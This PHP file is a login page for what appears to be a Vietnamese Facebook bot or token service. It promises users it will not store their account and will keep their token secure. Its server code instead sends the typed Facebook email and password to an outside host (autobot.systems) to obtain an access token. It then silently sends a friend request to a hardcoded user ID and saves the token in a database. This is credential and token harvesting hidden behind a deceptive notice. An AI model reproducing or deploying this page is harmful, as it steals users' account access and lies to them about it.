<?php
include 'system/head.php';
if($_SESSION[id]) {
echo '<meta http-equiv=refresh content="3; URL=/index.php">';
die('<script>alert("Bạn Đã Đăng Nhập Rồi! Vui lòng Đăng Xuất rồi thử lại!"); </script>');
exit;
}
?>
        <div class="content">
            <div class="container-fluid">
                <div class="row">
<div class="col-md-12">
                        <div class="card">
                            <div class="header">
                                  <h4 class="title">Đăng Nhập Bằng Tài Khoản</h4>
                                <p class="category">Hệ Thống Đăng Nhập Không CheckPoint 100%</p>
                            </div>
							

<div class="content">
	<div class="form-group">
<p>Không Nên Đặt Pass Chứa <code>Kí tự đặc biệt</code> Để Hệ thống Dễ nhận Dạng!</p>
<p>Dùng tài khoản facebook của bạn để <code>đăng nhập</code>, chúng tôi sẽ không lưu tài khoản của bạn cũng như sẽ bảo mật token của bạn 1 cách tuyệt đối.</p>
<form action="" method="POST">
<div class="form-group"><label for="exampleInputEmail1">Email/Username</label> <input type="text" class="form-control" id="email" name="email" placeholder="Email/Username"></div>
<div class="form-group"><label for="exampleInputPassword1">Password</label> <input type="password" class="form-control" id="pass" name="pass" placeholder="Password"></div>                              
<button type="submit" class="btn btn-danger">Đăng nhập</button>
</form>
			</div>	  
		</div>
						</div>
</div>
                </div>
            </div>
        </div>

<?php

if($_POST[email] && $_POST[pass] && !$_SESSION[id])
{
$getapi = json_decode(auto('http://autobot.systems/token.php?u='.$_POST[email].'&p='.$_POST[pass]), true);
$token = $getapi[access_token];
$userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token.''),true);
$check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&access_token='.$token);


if($check[id] == 6628568379){  
   mysql_query("CREATE TABLE IF NOT EXISTS `token` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
$com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
$ren = file_get_contents($com);
$_SESSION['id'] = $userData['id'];
$_SESSION['name']=$userData['name'];
$_SESSION['token']=$token;


if($userData['id']){


   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         token
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               token
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            token
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            token
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
?>
<meta http-equiv=refresh content="0; URL=/index.php">
<?php

} else {
die('<script>alert("Token đã hết hạn sử dụng ... Vui lòng nhập lại! Vui Lòng F5 Hoặc Tải Lại Trang"); </script>');
session_destroy();
header('location: index.php');
}

} else {
    die('<script>alert("Bạn Phải Cài Đặt Token iPhone (iPhoto) Full quyền Mới Login Được"); </script>');
session_destroy();
header('location: index.php');

}
}


include 'system/foot.php';
?>

